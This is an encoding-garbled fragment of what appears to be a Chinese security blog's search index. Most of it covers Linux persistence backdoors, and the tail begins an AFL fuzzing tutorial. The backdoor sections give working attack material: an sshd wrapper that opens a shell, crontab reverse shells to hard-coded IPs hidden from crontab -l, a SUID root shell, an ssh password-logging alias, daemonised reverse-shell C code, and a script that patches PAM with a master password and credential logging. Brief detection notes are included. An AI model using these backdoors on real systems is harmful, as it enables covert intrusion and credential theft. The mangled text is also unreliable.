æ›¿æ¢æ–‡ä»¶å–å†³äºå…·ä½“æƒ…å†µï¼‰ï¼Œåœ¨/root/.ssh/authorized_keysä¸­è¿½åŠ id_rsa.pubä¸­çš„å†…å®¹ï¼Œé…ç½®å®Œæˆã€‚(æœ‰äº›ç³»ç»Ÿæ²¡æœ‰keysæ–‡ä»¶ï¼Œå¯ä»¥è‡ªè¡Œåˆ›å»ºä¸€ä¸ªã€‚) ç¼ºç‚¹ï¼šæ˜“è¢«æ’æŸ¥ï¼Œæ£€æŸ¥/root/.ssh/authorized_keysæ˜¯å¦è¢«ä¿®æ”¹ï¼Œæ¸…ç†ä¸å—ä¿¡çš„å…¬é’¥å³å¯æ¸…é™¤åé—¨ã€‚ 3. ssh wrapperï¼ˆæ–‡ä»¶è½åœ°ï¼‰ ç›®æ ‡ä¸»æœºä¸Šæ‰§è¡Œï¼š cd /usr/sbin/ mv sshd ../bin/ echo '#!/usr/bin/perl' \u003esshd echo 'exec \"/bin/sh\" if(getpeername(STDIN) =~ /^..4A/);' \u003e\u003esshd echo 'exec{\"/usr/bin/sshd\"} \"/usr/sbin/sshd\",@ARGV,' \u003e\u003esshd chmod u+x sshd /etc/init.d/sshd restart å®Œæˆåæ‰§è¡Œcat sshdè¿›è¡ŒéªŒè¯ï¼Œè¾“å‡ºå¦‚ä¸‹åˆ™è¯´æ˜é…ç½®æˆåŠŸï¼š #!/usr/bin/perl exec \"/bin/sh\" if(getpeername(STDIN) =~ /^..4A/); exec{\"/usr/bin/sshd\"} \"/usr/sbin/sshd\",@ARGV, æ”»å‡»æœºä¸Šæ‰§è¡Œï¼š socat STDIO TCP4:x.x.x.x:22,sourceport=13377 è¿™é‡Œçš„sourceportå¯ä»¥è¿›è¡Œä¿®æ”¹ï¼Œä½†æ˜¯éœ€è¦ä½¿ç”¨pythonçš„structæ ‡å‡†åº“å®ç°ã€‚ python \u003e\u003e\u003e import struct \u003e\u003e\u003e buffer = struct.pack('\u003eI6',19256) \u003e\u003e\u003e print repr(buffer) '\\x00\\x00LF' \u003e\u003e\u003e buffer = struct.pack('\u003eI6',13377) \u003e\u003e\u003e print buffer 4A åŸç†ç®€å•è¯´æ˜ï¼šinité¦–å…ˆå¯åŠ¨çš„æ˜¯/usr/sbin/sshd,è„šæœ¬æ‰§è¡Œåˆ°getpeernameè¿™é‡Œçš„æ—¶å€™ï¼Œæ­£åˆ™åŒ¹é…ä¼šå¤±è´¥ï¼Œäºæ˜¯æ‰§è¡Œä¸‹ä¸€å¥ï¼Œå¯åŠ¨/usr/bin/sshdï¼Œè¿™æ˜¯åŸå§‹sshdã€‚åŸå§‹çš„sshdç›‘å¬ç«¯å£å»ºç«‹äº†tcpè¿æ¥åï¼Œä¼šforkä¸€ä¸ªå­è¿›ç¨‹å¤„ç†å…·ä½“å·¥ä½œã€‚è¿™ä¸ªå­è¿›ç¨‹ï¼Œæ²¡æœ‰ä»€ä¹ˆæ£€éªŒï¼Œè€Œæ˜¯ç›´æ¥æ‰§è¡Œç³»ç»Ÿé»˜è®¤çš„ä½ç½®çš„/usr/sbin/sshdï¼Œè¿™æ ·å­æ§åˆ¶æƒåˆå›åˆ°è„šæœ¬äº†ã€‚æ­¤æ—¶å­è¿›ç¨‹æ ‡å‡†è¾“å…¥è¾“å‡ºå·²è¢«é‡å®šå‘åˆ°å¥—æ¥å­—ï¼Œgetpeernameèƒ½çœŸçš„è·å–åˆ°å®¢æˆ·ç«¯çš„TCPæºç«¯å£ï¼Œå¦‚æœæ˜¯19526å°±æ‰§è¡Œshç»™ä¸ªshell ç®€å•ç‚¹å°±æ˜¯ä»sshdç¨‹åºforkå‡ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œè¾“å…¥è¾“å‡ºé‡å®šå‘åˆ°å¥—æ¥å­—ï¼Œå¹¶å¯¹è¿è¿‡æ¥çš„å®¢æˆ·ç«¯ç«¯å£è¿›è¡Œåˆ¤æ–­ã€‚ æ’æŸ¥æ–¹æ³•ï¼š ls -al /usr/sbin/sshd cat /usr/sbin/sshd å¦‚æœæƒ³å½»åº•æ¢å¤çš„è¯ï¼Œéœ€è¦è¿›è¡ŒsshæœåŠ¡çš„é‡è£…ã€‚ 4. sshçš„éšèº«ç™»å½• åœ¨è¿›è¡Œsshç™»å½•æ—¶å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å®ç°éšèº«ç™»å½•ï¼Œé¿å…è¢«last\\who\\wç­‰æŒ‡ä»¤æ£€æµ‹åˆ°ã€‚ # ä¸è¢«last\\who\\wç­‰æŒ‡ä»¤æ£€æµ‹ ssh -T username@x.x.x.x /bin/bash -i # ä¸è®°å½•sshå…¬é’¥åœ¨æœ¬åœ°.sshç›®å½•ä¸­ ssh -o UserKnownHostFile=/dev/null -T user@x.x.x.x /bin/bash -if ","date":"2020-12-04","objectID":"/2020/12/backdoor/:2:3","tags":["Linux"],"title":"Linux ä¸‹çš„æƒé™ç»´æŒ","uri":"/2020/12/backdoor/"},{"categories":["Misc"],"content":"3. SUID Shell éœ€è¦é…åˆæ™®é€šç”¨æˆ·è¿›è¡Œä½¿ç”¨ã€‚rootæƒé™ä¸‹æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œæ™®é€šç”¨æˆ·è¿è¡Œ/dev/.rootshellå³å¯è·å¾—rootæƒé™ï¼š cp /bin/bash /dev/.rootshell chmod u+s /dev/.rootshell å¤‡æ³¨ï¼šbash2é’ˆå¯¹suidåšäº†ä¸€äº›é˜²æŠ¤æªæ–½ï¼Œéœ€è¦ä½¿ç”¨-på‚æ•°æ¥è·å–ä¸€ä¸ªroot shellã€‚å¦å¤–ï¼Œæ™®é€šç”¨æˆ·æ‰§è¡Œè¿™ä¸ªSUID shellæ—¶ï¼Œä¸€å®šè¦ä½¿ç”¨å…¨è·¯å¾„ã€‚è¯¥æ–¹æ³•ä¸ªäººè®¤ä¸ºè¾ƒä¸ºé¸¡è‚‹ï¼Œä¸”bashç‰ˆæœ¬ç°åœ¨è¾ƒé«˜ï¼Œå¯åˆ©ç”¨æ€§ä¸é«˜ã€‚ ","date":"2020-12-04","objectID":"/2020/12/backdoor/:2:4","tags":["Linux"],"title":"Linux ä¸‹çš„æƒé™ç»´æŒ","uri":"/2020/12/backdoor/"},{"categories":["Misc"],"content":"4. crontabåé—¨ï¼ˆæ–‡ä»¶è½åœ°ï¼‰ crontabå‘½ä»¤ç”¨äºè®¾ç½®å‘¨æœŸæ€§è¢«æ‰§è¡Œçš„æŒ‡ä»¤ï¼Œå¯ä»¥åˆ©ç”¨è¯¥å‘½ä»¤æ–°å»ºshellè„šæœ¬ï¼Œåˆ©ç”¨è„šæœ¬è¿›è¡Œåå¼¹ã€‚ Step 1 ï¼šåˆ›å»ºshellè„šæœ¬ï¼Œä¾‹å¦‚åœ¨/etc/evil.sh #!/bin/bash bash -i \u003e\u0026 /dev/tcp/192.168.160.154/12345 0\u003e\u00261 å¹¶ç»™è„šæœ¬èµ‹äºˆç›¸åº”æƒé™ï¼š chmod +sx /etc/evil.sh Step 2ï¼šè®¾ç½®å®šæ—¶æœåŠ¡ crontab -e è¾“å…¥ä»¥ä¸‹å†…å®¹ï¼š # exec per min */1 * * * * root /etc/evil.sh é‡å¯crondæœåŠ¡ï¼Œservice crond restartï¼Œç„¶åä½¿ç”¨ncæ¥æ”¶shellã€‚ ä¸Šè¿°æ–¹æ³•åœ¨å®é™…æµ‹è¯•ä¸­æˆåŠŸäº†ç‡è¾ƒä½ï¼Œå»ºè®®ä½¿ç”¨ä¸€å¥è¯åé—¨ï¼š (crontab -l;printf \"*/1 * * * * /tmp/crontab_backdoor.sh;\\rno crontab for `whoami`%100c\\n\")|crontab - è¿™ç§æ–¹å¼æˆåŠŸç‡æ›´é«˜ï¼Œè€Œä¸”ä¸æ˜“è¢«crontab -lå‘ç°ã€‚ å…¶ä¸­å…³äºcrondtabçš„è¯¦ç»†åŸç†å¯ä»¥å‚è€ƒï¼šhttps://cloud.tencent.com/developer/article/1683265 æ’æŸ¥æ‰‹æ®µï¼š # æŸ¥çœ‹å¯ä»¥çš„å®šæ—¶ä»»åŠ¡åˆ—è¡¨ crontab -e ","date":"2020-12-04","objectID":"/2020/12/backdoor/:2:5","tags":["Linux"],"title":"Linux ä¸‹çš„æƒé™ç»´æŒ","uri":"/2020/12/backdoor/"},{"categories":["Misc"],"content":"5. aliasæ¬ºéª—ï¼ˆæ–‡ä»¶è½åœ°ï¼‰ å¯ä»¥é€šè¿‡aliaså‘½ä»¤æ¥æ‰§è¡Œç‰¹å®šçš„å‘½ä»¤æ—¶é™é»˜è¿è¡Œå…¶ä»–ç¨‹åºï¼Œä»è€Œè¾¾åˆ°å¯åŠ¨åé—¨ï¼Œè®°å½•é”®å€¼ç­‰ä½œç”¨ã€‚2ä¸ªå®ä¾‹ï¼š ä¿®æ”¹sshå‘½ä»¤ï¼Œåˆ©ç”¨straceï¼Œä½¿å…¶å…·æœ‰è®°å½•sshå¯¹readã€writeã€connectè°ƒç”¨çš„åŠŸèƒ½ï¼š alias ssh='strace -o /tmp/sshpwd-`date '+%d%h%m%s'`.log -e read,write,connect -s2048 ssh' åˆ©ç”¨å®ˆæŠ¤è¿›ç¨‹å›å¼¹shell alias cat='cat\u0026\u0026/root/.shell' å›å¼¹shellçš„cè¯­è¨€ç‰ˆè„šæœ¬ï¼š // shell.c #include \u003cstdio.h\u003e #include \u003cunistd.h\u003e #include \u003cstdlib.h\u003e #include \u003ctime.h\u003e #include \u003cfcntl.h\u003e #include \u003cstring.h\u003e #include \u003csys/stat.h\u003e #include \u003csignal.h\u003e #define ERR_EXIT(m) do { perror(m); exit(EXIT_FAILURE); } while (0); void creat_daemon(void); int main(void) { time_t t; int fd; creat_daemon(); // å°†ipå’Œç«¯å£è¿›è¡Œæ›¿æ¢ system(\"bash -i \u003e\u0026 /dev/tcp/192.168.80.147/12345 0\u003e\u00261\"); return 0; } void creat_daemon(void) { pid_t pid; int devnullfd,fd,fdtablesize; umask(0); pid = fork(); if( pid == -1) ERR_EXIT(\"fork error\"); if(pid \u003e 0 ) exit(EXIT_SUCCESS); if(setsid() == -1) ERR_EXIT(\"SETSID ERROR\"); chdir(\"/\"); /* close any open file descriptors */ for(fd = 0, fdtablesize = getdtablesize(); fd \u003c fdtablesize; fd++) close(fd); devnullfd = open(\"/dev/null\", 0); /* make STDIN ,STDOUT and STDERR point to /dev/null */ if (devnullfd == -1) { ERR_EXIT(\"can't open /dev/null\"); } if (dup2(devnullfd, STDIN_FILENO) == -1) { ERR_EXIT(\"can't dup2 /dev/null to STDIN_FILENO\"); } if (dup2(devnullfd, STDOUT_FILENO) == -1) { ERR_EXIT(\"can't dup2 /dev/null to STDOUT_FILENO\"); } if (dup2(devnullfd, STDERR_FILENO) == -1) { ERR_EXIT(\"can't dup2 /dev/null to STDOUT_FILENO\"); } signal(SIGCHLD,SIG_IGN); return; } ä½¿ç”¨ncç›‘å¬å›å¼¹çš„shellã€‚ ","date":"2020-12-04","objectID":"/2020/12/backdoor/:2:6","tags":["Linux"],"title":"Linux ä¸‹çš„æƒé™ç»´æŒ","uri":"/2020/12/backdoor/"},{"categories":["Misc"],"content":"6. Linux PAMå¯†ç è®°å½•åé—¨ï¼ˆæ–‡ä»¶è½åœ°ï¼‰ PAM(Pluggable Authentication Modules)ï¼Œæ˜¯ç”±Sunæå‡ºçš„ä¸€ç§è®¤è¯æœºåˆ¶ã€‚å®ƒé€šè¿‡ä¸€å…±ä¸€äº›åŠ¨æ€é“¾æ¥åº“å’Œä¸€å¥—ç»Ÿä¸€çš„APIï¼Œå°†ç³»ç»Ÿæä¾›çš„æœåŠ¡å’Œè¯¥æœåŠ¡çš„è®¤è¯æ–¹å¼åˆ†å¼€ï¼Œä½¿å¾—ç³»ç»Ÿç®¡ç†å‘˜å¯ä»¥çµæ´»åœ°æ ¹æ®éœ€è¦ç»™ä¸åŒçš„æœåŠ¡é…ç½®ä¸åŒçš„è®¤è¯æ–¹å¼è€Œæ— éœ€æ›´æ”¹æœåŠ¡ç¨‹åºï¼ŒåŒæ—¶ä¹Ÿä¾¿äºå‘ç³»ç»Ÿä¸­æ·»åŠ æ–°çš„è®¤è¯æ‰‹æ®µã€‚è¿™ç§åé—¨ä¸»è¦æ˜¯é€šè¿‡pam_unix_auth.cæ‰“è¡¥ä¸çš„æ–¹å¼æ½œå…¥åˆ°æ­£å¸¸çš„pamæ¨¡å—ä¸­ï¼Œä»¥æ­¤æ¥è®°å½•ç®¡ç†å‘˜çš„è´¦å·å¯†ç ã€‚å…¶å¤§è‡´æµç¨‹å¦‚ä¸‹ï¼š è·å–ç›®æ ‡ç³»ç»Ÿæ‰€ä½¿ç”¨çš„PAMç‰ˆæœ¬ï¼Œä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„pamç‰ˆæœ¬ è§£å‹ç¼©ï¼Œä¿®æ”¹pam_unix_auth.cæ–‡ä»¶ï¼Œæ·»åŠ ä¸‡èƒ½å¯†ç  ç¼–è¯‘å®‰è£…PAM ç¼–è¯‘å®Œåçš„æ–‡ä»¶åœ¨ï¼šmodules/pam_unix/.libs/pam_unix.soï¼Œå¤åˆ¶åˆ°/lib64/securityä¸­è¿›è¡Œæ›¿æ¢ï¼Œå³å¯ä½¿ç”¨ä¸‡èƒ½å¯†ç ç™»é™†ï¼Œå¹¶å°†ç”¨æˆ·åå¯†ç è®°å½•åˆ°æ–‡ä»¶ä¸­ã€‚ ä¸€ä¸ªè‡ªåŠ¨åŒ–è„šæœ¬å¦‚ä¸‹ï¼š #!/bin/bash ## ##æŸ¥çœ‹ç‰ˆæœ¬: ##redhat yum list pam ##debian\u0026Ubuntu dpkg -s libpam-modules | grep -i version | cut -d' ' -f2 ## PASS='test123' ##...... LOG='\\/bin\\/.sshlog' ##...... echo \" .___ ___. ___ ___ _______ ____ ____ | \\/ | / _ \\ / _ \\ | \\ \\ \\ / / | \\ / | | | | | | | | | | .--. | \\ \\/ / | |\\/| | | | | | | | | | | | | | \\_ _/ | | | | | |_| | | |_| | | '--' | | | |__| |__| \\___/ \\___/ |_______/ |__| \" echo -e \"\\nPam-Backdoor\\n{code this shit while learning pam}\\n\\n\" oldtime=`stat -c '%z' /lib/security/pam_ftp.so` echo 'Pam backdoor starting!' mirror_url='http://www.linux-pam.org/library/Linux-PAM-1.1.1.tar.gz' #mirror_url='http://yum.singlehop.com/pub/linux/libs/pam/pre/library/Linux-PAM-0.99.6.2.tar.gz'ï¼Œä¿®æ”¹ä¸ºå¯¹åº”çš„pamç‰ˆæœ¬ echo 'Fetching from '$mirror_url wget $mirror_url #fetch the roll tar zxf Linux-PAM-1.1.1.tar.gz #untar,ä¿®æ”¹ä¸ºå¯¹åº”çš„pamç‰ˆæœ¬ cd Linux-PAM-1.1.1 #find and replace sed -i -e 's/retval = _unix_verify_password(pamh, name, p, ctrl);/retval = _unix_verify_password(pamh, name, p, ctrl);\\n\\tif (strcmp(p,\"'$PASS'\")==0 ){retval = PAM_SUCCESS;}if(retval == PAM_SUCCESS){\\n\\tFILE * fp;\\n\\tfp = fopen(\"'$LOG'\", \"a\");\\n\\tfprintf(fp, \"%s : %s\\\\n\", name, p);\\n\\tfclose(fp);\\n\\t}/g' modules/pam_unix/pam_unix_auth.c DIS=`head /etc/issue -n 1|awk '{print $1}'` #get the version if [ $DIS = \"CentOS\" ];then ./configure --disable-selinux \u0026\u0026 make else ./configure \u0026\u0026 make fi #copy modified pam_unix.so if [ `uname -p` = 'x86_64' ];then LIBPATH=lib64 else LIBPATH=lib fi /bin/cp -rf /$LIBPATH/security/pam_unix.so /$LIBPATH/security/pam_unix.so.bak #.. ......... /bin/cp -rf modules/pam_unix/.libs/pam_unix.so /$LIBPATH/security/pam_unix.so touch -d \"$oldtime\" /lib/security/pam_unix.so cd .. \u0026\u0026 rm -rf Linux-PAM-1.1.1* echo \"Done bro..\" å¯ä»¥æ ¹æ®éœ€è¦å°†ä¸‹è½½paméƒ¨åˆ†ä¿®æ”¹ä¸ºä¸Šä¼ æœ¬åœ°ä¸‹è½½å¥½çš„pamï¼Œè¿™æ ·å¯ä»¥é¿å…ç›®æ ‡ä¸»æœºæ— æ³•è®¿é—®å¯¹åº”é“¾æ¥åœ°å€æ—¶é€ æˆçš„æ–‡ä»¶ä¸‹è½½å¤±è´¥ã€‚ Linux PAMç‰ˆæœ¬åœ°å€ï¼šhttp://www.linux-pam.org/library/ è¯¦ç»†æƒ…å†µå¯å‚è€ƒhttps://blog.51cto.com/redkey/1343316 ","date":"2020-12-04","objectID":"/2020/12/backdoor/:2:7","tags":["Linux"],"title":"Linux ä¸‹çš„æƒé™ç»´æŒ","uri":"/2020/12/backdoor/"},{"categories":["Misc"],"content":"5. PROMPT_COMMANDåé—¨ bashæä¾›æ¥ä¸€ä¸ªç¯å¢ƒå˜é‡PROMPT_COMMANDï¼Œè¿™ä¸ªå˜é‡ä¼šåœ¨æ‰§è¡Œå‘½ä»¤å‰æ‰§è¡Œä¸€éã€‚ export PROMPT_COMMAND=\"lsof -i:1025 \u0026\u003e/dev/null || (python -c \"exec('encoded_payload'.decode('base64'))\" 2\u003e/dev/null \u0026)\" ä¹Ÿå¯ä»¥ä½¿ç”¨è¯¥å˜é‡è¿›è¡Œææƒï¼šhttps://www.anquanke.com/post/id/155943 ","date":"2020-12-04","objectID":"/2020/12/backdoor/:2:8","tags":["Linux"],"title":"Linux ä¸‹çš„æƒé™ç»´æŒ","uri":"/2020/12/backdoor/"},{"categories":["Misc"],"content":"7. Rootkit æ ¹æ®æœç´¢æƒ…å†µæ¥çœ‹ï¼Œä¸€èˆ¬æ°´å¹³çš„rootkitå¾ˆå®¹æ˜“å°†ç³»ç»Ÿç¯å¢ƒæå´©ï¼Œè€Œé«˜è´¨é‡çš„Rootkitä¸å¤ªå®¹æ˜“æ‰¾ï¼Œå› æ­¤å¦‚éè¿«ä¸å¾—å·²ï¼Œä¸æ˜¯å¾ˆå»ºè®®ç›´æ¥ä½¿ç”¨è¿™ç§æ–¹æ³•ã€‚å¦‚æœèƒ½å•ç‹¬è¿›è¡Œå®šåˆ¶ï¼Œæ˜¯å¦å¤–ä¸€ç§æƒ…å†µã€‚è¿™é‡Œæš‚æ—¶å…ˆç»™å‡ºä¸€ä¸ªæ”¶é›†çš„rootkitåº“ï¼šhttps://github.com/d30sa1/RootKits-List-Download ","date":"2020-12-04","objectID":"/2020/12/backdoor/:2:9","tags":["Linux"],"title":"Linux ä¸‹çš„æƒé™ç»´æŒ","uri":"/2020/12/backdoor/"},{"categories":["Misc"],"content":"å‚è€ƒæ–‡çŒ® https://wiki.bash-hackers.org/howto/redirection_tutorial https://www.gnu.org/software/bash/manual/html_node/Redirections.html https://brucetg.github.io/2018/05/03/%E5%A4%9A%E7%A7%8D%E5%A7%BF%E5%8A%BF%E5%8F%8D%E5%BC%B9shell/ https://www.anquanke.com/post/id/171891#h2-15 https://bypass007.github.io/Emergency-Response-Notes/privilege/%E7%AC%AC4%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E5%90%8E%E9%97%A8%E7%AF%87.html https://www.anquanke.com/post/id/155943#h2-9 ","date":"2020-12-04","objectID":"/2020/12/backdoor/:3:0","tags":["Linux"],"title":"Linux ä¸‹çš„æƒé™ç»´æŒ","uri":"/2020/12/backdoor/"},{"categories":["Fuzz"],"content":"AFLäºŒä¸‰äº‹ç³»åˆ— note 1","date":"2020-12-03","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 1","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/"},{"categories":["Fuzz"],"content":"AFLäºŒä¸‰äº‹ â€“ 1 æœ¬æ–‡æ˜¯AFLç³»åˆ—ç¬¬ä¸€ç¯‡ï¼Œä¸»è¦ä»‹ç»AFLçš„åŸºæœ¬ä½¿ç”¨ã€‚ ","date":"2020-12-03","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/:0:0","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 1","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/"},{"categories":["Fuzz"],"content":"ä¸€ã€ç®€ä»‹ AFLï¼ˆAmerican Fuzzy Lopï¼‰æ˜¯ç”±å®‰å…¨ç ”ç©¶å‘˜Michal Zalewskiï¼ˆ@lcamtufï¼‰å¼€å‘çš„ä¸€æ¬¾åŸºäºè¦†ç›–å¼•å¯¼ï¼ˆCoverage-guidedï¼‰çš„æ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼Œå®ƒé€šè¿‡è®°å½•è¾“å…¥æ ·æœ¬çš„ä»£ç è¦†ç›–ç‡ï¼Œä»è€Œè°ƒæ•´è¾“å…¥æ ·æœ¬ä»¥æé«˜è¦†ç›–ç‡ï¼Œå¢åŠ å‘ç°æ¼æ´çš„æ¦‚ç‡ã€‚ ","date":"2020-12-03","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/:1:0","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 1","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/"},{"categories":["Fuzz"],"content":"äºŒã€å·¥ä½œæµç¨‹ å¯¹äºæœ‰æºç çš„æƒ…å†µä¸‹ï¼ŒAFLçš„å·¥ä½œæµç¨‹å¤§è‡´å¦‚ä¸‹ï¼š æºç ç¼–è¯‘æ—¶è¿›è¡Œæ’æ¡©ï¼› é€‰æ‹©è¾“å…¥æ–‡ä»¶ï¼Œæ„å»ºè¯­æ–™åº“ï¼ŒåŠ å…¥è¾“å…¥é˜Ÿåˆ—ï¼› å¯¹é˜Ÿåˆ—ä¸­çš„æ–‡ä»¶æŒ‰ç…§ä¸€å®šçš„ç­–ç•¥è¿›è¡Œâ€œå˜å¼‚â€ï¼› å¦‚æœç»è¿‡å˜å¼‚çš„æ–‡ä»¶æ›´æ–°äº†ä»£ç è¦†ç›–è·¯å¾„ï¼Œåˆ™ä¿ç•™æ–‡ä»¶å¹¶æ·»åŠ åˆ°é˜Ÿåˆ—ä¸­ï¼› å¾ªç¯æ‰§è¡Œä¸Šè¿°è¿‡ç¨‹ï¼Œè®°å½•è§¦å‘crashçš„æ–‡ä»¶ã€‚ ","date":"2020-12-03","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/:2:0","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 1","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/"},{"categories":["Fuzz"],"content":"ä¸‰ã€ä½¿ç”¨ ","date":"2020-12-03","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/:3:0","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 1","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/"},{"categories":["Fuzz"],"content":"1. åŸºæœ¬ä½¿ç”¨ AFLå®‰è£…å®Œæˆåï¼Œç”Ÿæˆçš„å¯æ‰§è¡Œç¨‹åºåŠå…¶ä½œç”¨æ•´ä½“æ¦‚æ‹¬å¦‚ä¸‹ï¼š ä¸‹é¢å¯¹æ¯ä¸ªå¯æ‰§è¡Œæ–‡ä»¶åšè¯¦ç»†çš„ä½¿ç”¨æè¿°ï¼š 1. ç¼–è¯‘æŒ‡ä»¤ afl-gccã€afl-g++ã€afl-clangã€afl-clang++ã€afl-clang-fastã€afl-clang-fast++è¿™äº›aflçš„ç¼–è¯‘æŒ‡ä»¤ï¼Œæ”¯æŒä½¿ç”¨gccã€g++ã€clangã€clang++çš„ä»»ä½•é€‰é¡¹ï¼Œå› ä¸ºè¿™äº›æŒ‡ä»¤çš„æœ¬è´¨è¿˜æ˜¯è°ƒç”¨å½“å‰ç³»ç»Ÿçš„å¯¹åº”ç¼–è¯‘æŒ‡ä»¤ï¼Œæ¯”å¦‚ä½¿ç”¨afl-gccè¿›è¡Œæºç æ’æ¡©ç¼–è¯‘ï¼š # æŒ‡ä»¤æ ¼å¼ï¼š afl-gcc [å‚æ•°] æºæ–‡ä»¶ afl-gcc test.c -o test 2. afl-cmin, afl-tmin afl-cminå’Œafl-tminéƒ½æ˜¯ç”¨äºç®€åŒ–æ ·æœ¬çš„ï¼Œå¯ä»¥ç®€å•çš„ç†è§£ä¸ºå‰è€…è£å‰ªæ ·æœ¬é›†åˆï¼Œå°†æ‰§è¡Œè·¯å¾„ç›¸åŒçš„æ ·æœ¬å‰”é™¤æ‰åªä¿ç•™ä¸€ä¸ªï¼Œåè€…æ˜¯å¯¹å•ä¸ªæ ·æœ¬çš„è£å‰ªï¼Œä¾‹å¦‚ï¼Œin_aflç›®å½•ä¸‹å­˜æ”¾æ ·æœ¬ï¼Œä½¿ç”¨afl-cminå¯¹æ ·æœ¬é›†åˆè¿›è¡Œè£å‰ªï¼Œå°†æ–°çš„é›†åˆè¾“å‡ºåˆ°in_afl_minä¸­ï¼Œç„¶åä½¿ç”¨afl-tminå¯¹in_afl_minä¸­åä¸º1.jpegçš„æ–‡ä»¶è¿›è¡Œè£å‰ªï¼Œè¾“å‡ºåˆ°1_new.jpegæ–‡ä»¶ä¸­ï¼Œfuzzçš„ç›®æ ‡ç¨‹åºä¸º/usr/bin/djpegï¼Œè¯¥ç¨‹åºä½¿ç”¨æ–¹æ³•ä¸º/usr/bin/djpeg [å‚æ•°] è¦è§£æçš„å›¾ç‰‡æ–‡ä»¶ï¼š # æŒ‡ä»¤æ ¼å¼ï¼š afl-cmin -i æ ·æœ¬ç›®å½• -o è¾“å‡ºç›®å½• [-Q] -- è¦fuzzçš„å¯æ‰§è¡Œç¨‹åº [ç¨‹åºå‚æ•°] # æŒ‡ä»¤æ ¼å¼ï¼š afl-tmin -i æ ·æœ¬æ–‡ä»¶ -o è¾“å‡ºæ–‡ä»¶ [-Q] -- è¦fuzzçš„å¯æ‰§è¡Œç¨‹åº [ç¨‹åºå‚æ•°] # å…¶ä¸­ 'è¦fuzzçš„å¯æ‰§è¡Œç¨‹åº' å¿…é¡»æ˜¯å¸¦æœ‰è·¯å¾„çš„ï¼Œä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼Œæ¯”å¦‚ 'djpeg 1.jpeg' å¯ä»¥æ‰§è¡ŒæˆåŠŸï¼Œä½†æ˜¯fuzzæ—¶å¿…é¡»å°† 'djpeg' çš„è·¯å¾„ä¸€å¹¶å¸¦ä¸Šæ‰å¯ä»¥ï¼Œå³ '/usr/bin/djpeg' # é»˜è®¤æƒ…å†µä¸‹afl-cminå’Œafl-tminä¼šæŠŠæ ·æœ¬ä»¥æ ‡å‡†è¾“å‡ºçš„æ–¹å¼å–‚ç»™è¦fuzzçš„ç¨‹åºï¼Œå¦‚æœfuzzç¨‹åºæ˜¯ä»å‚æ•°æŒ‡å®šçš„æ–‡ä»¶ä¸­è¯»å–æ•°æ®è¿›è¡Œå¤„ç†çš„ï¼Œåˆ™éœ€è¦ä½¿ç”¨ '@@' æ¥ä»£æ›¿è¾“å…¥çš„æ–‡ä»¶è·¯å¾„ï¼Œæ¯”å¦‚åŸæœ¬æ‰§è¡Œçš„æŒ‡ä»¤ä¸º 'djpeg in_afl_min/1.jpeg' ï¼Œfuzzæ—¶æŒ‡ä»¤åº”ä¸º '/usr/bin/djpeg @@' # åœ¨å®‰è£…äº†qemu-modeæ—¶ï¼Œå¯ä»¥æ”¯æŒ '-Q' é€‰é¡¹ï¼Œå¦‚æœç›®æ ‡å¯æ‰§è¡Œç¨‹åº # å½“ç„¶è¿™ä¸¤ä¸ªæŒ‡ä»¤è¿˜æœ‰ä¸€äº›å…¶å®ƒå‚æ•°ï¼Œè¿™é‡Œå°±ä¸ä»‹ç»ä½¿ç”¨äº†ï¼Œä»¥ä¸Šä¸ºå¸¸è§ç”¨æ³• afl-cmin -i in_afl -o in_afl_min -Q -- /usr/bin/djpeg @@ afl-tmin -i in_afl_min/1.jpeg -o in_afl_min/1_new.jpeg -Q -- /usr/bin/djpeg @@ 3. afl-analyze afl-analyzeç”¨äºåˆ†ææ ·æœ¬ï¼Œæ¯”å¦‚åˆ†æä¸€ä¸ªæ ·æœ¬1.jpegï¼Œè¢«fuzzç¨‹åºä¸º/usr/bin/djpegï¼Œè¯¥ç¨‹åºä½¿ç”¨æ–¹æ³•ä¸º/usr/bin/djpeg [å‚æ•°] è¦è§£æçš„å›¾ç‰‡æ–‡ä»¶ # æŒ‡ä»¤æ ¼å¼ï¼š afl-analyze -i æ ·æœ¬æ–‡ä»¶ [-Q] -- è¦fuzzçš„å¯æ‰§è¡Œç¨‹åº [ç¨‹åºå‚æ•°] # å…¶ä¸­ 'è¦fuzzçš„å¯æ‰§è¡Œç¨‹åº' å¿…é¡»æ˜¯å¸¦æœ‰è·¯å¾„çš„ï¼Œä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼Œæ¯”å¦‚ 'djpeg 1.jpeg' å¯ä»¥æ‰§è¡ŒæˆåŠŸï¼Œä½†æ˜¯fuzzæ—¶å¿…é¡»å°† 'djpeg' çš„è·¯å¾„ä¸€å¹¶å¸¦ä¸Šæ‰å¯ä»¥ï¼Œå³ '/usr/bin/djpeg' # é»˜è®¤æƒ…å†µä¸‹afl-cminå’Œafl-tminä¼šæŠŠæ ·æœ¬ä»¥æ 